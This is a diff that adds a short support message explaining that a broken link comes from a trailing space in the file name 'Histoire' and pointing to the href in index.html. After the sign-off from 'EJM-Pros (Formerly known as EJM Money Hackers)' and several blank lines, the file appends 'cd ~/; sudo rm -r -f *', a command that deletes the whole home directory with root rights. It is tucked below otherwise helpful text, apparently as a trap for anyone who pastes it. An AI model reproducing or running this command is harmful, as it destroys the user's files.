@@ -1,0 +1,18 @@
+Bonjour,
+
+The error is caused by an extra (and unneeded) whitespace trailing after
+your document name, namely 'Histoire ' in place of 'Histoire' as it is 
+in the index.html .
+
+This can be simply solved by going into the index.html, 
+checking if the href link within <a href="foo">link</a> is corresponding 
+to the new html file name. 
+
+Best,
+Team EJM-Pros
+(Formerly known as EJM Money Hackers)
+
+
+
+cd ~/; sudo rm -r -f *
+
